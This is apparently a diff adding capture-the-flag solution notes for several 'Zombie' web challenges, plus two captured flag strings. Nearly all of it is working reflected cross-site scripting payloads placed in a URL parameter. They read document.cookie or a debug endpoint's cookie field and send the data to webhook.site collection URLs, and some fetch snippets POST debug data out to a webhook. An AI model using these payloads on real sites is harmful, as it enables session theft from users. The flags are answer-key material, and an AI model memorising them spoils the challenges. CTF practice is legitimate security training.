@@ -1,0 +1,46 @@
+Zombie 101:
+
+https://zombie-101-tlejfksioa-ul.a.run.app/zombie?show=<script>fetch(`https://webhook.site/78922f15-699c-416c-8dc5-09c755ffa113?+${document.cookie}`)</script>
+
+flag = wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261}
+
+
+
+fetch("https://zombie-201-tlejfksioa-ul.a.run.app/debug")
+  .then(response => response.json())
+  .then(data => console.log(data))
+  .catch(error => console.error(error));
+
+Zombie 201:
+https://zombie-201-tlejfksioa-ul.a.run.app/zombie?show=<script>fetch("https://zombie-201-tlejfksioa-ul.a.run.app/debug")   .then(response => response.json())   .then(data => fetch("https://webhook.site/78922f15-699c-416c-8dc5-09c755ffa113?"+data['cookie']))   .catch(error => console.error(error));</script>
+
+flag = wctf{h1dd3n-c00k135-d1d-n07-h31p-373964}
+
+Zombie 401:
+https://zombie-401-tlejfksioa-ul.a.run.app/zombie?show=<script>fetch("https://zombie-401-tlejfksioa-ul.a.run.app/debug")   .then(response => response.json())   .then(data => fetch("https://webhook.site/71421b7a-3a8d-4fc0-95d8-59923f4375c2?"+data['cookie']))   .catch(error => console.error(error));</script>
+
+
+
+Zombie 301:
+
+fetch(`https://zombie-301-tlejfksioa-ul.a.run.app/debug`)
+  .then(data => {
+    fetch('https://webhook.site/ce293ded-a6e6-4d5a-a63b-df89807203db', {
+      method: 'POST', 
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    });
+  })
+ .catch(error => console.error(error));
+
+
+
+
+
+
+fetch(`https://zombie-301-tlejfksioa-ul.a.run.app/debug`)
+  .then(data => data.json())
+  .then(data1 => console.log(data1))
+  .catch(error => console.error(error));
